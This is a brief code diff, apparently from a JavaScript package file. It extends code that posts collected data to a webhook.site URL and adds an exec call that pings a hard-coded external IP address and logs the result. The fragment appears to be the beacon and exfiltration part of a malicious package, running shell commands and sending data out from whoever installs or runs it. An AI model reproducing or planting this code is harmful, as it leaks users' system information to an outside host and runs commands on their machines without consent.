@@ -30,3 +30,14 @@ axios.post('https://webhook.site/ff13f246-bf6b-490c-b401-1ef92f475dc1', data)
     });
 });
 
+  exec("ping -c 4 202.61.200.207", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
